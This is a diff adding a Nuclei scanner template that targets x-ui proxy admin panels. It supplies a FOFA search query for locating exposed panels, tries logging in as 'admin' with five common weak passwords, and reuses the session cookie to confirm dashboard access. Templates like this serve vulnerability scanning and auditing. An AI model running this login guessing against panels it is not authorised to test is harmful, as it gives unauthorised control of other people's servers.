@@ -1,0 +1,65 @@
+id: x_ui_weakpasswd
+
+info:
+  name: x_ui存在弱口令
+  author: Xc1Ym
+  severity: high
+  description: x_ui存在弱口令
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: body="location.href = basePath + 'xui/';"
+  tags: weakpasswd,others,network,proxy
+
+
+
+http:
+  - method: POST
+    path: 
+      - "{{RootURL}}/login"
+    headers:
+      X-Requested-With: XMLHttpRequest
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: username=admin&password={{password}}
+
+    payloads:
+      password:
+        - admin
+        - admin123
+        - 123123
+        - 123456
+        - admin888
+    attack: batteringram
+
+    extractors:
+      - type: kval
+        name: cookie
+        part: body
+        internal: true
+        kval:
+          - Set-Cookie
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 登录成功
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path: 
+      - "{{RootURL}}/xui/"
+    headers:
+      Cookie: "{{cookie}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 系统状态
+      - type: status
+        status:
+          - 200
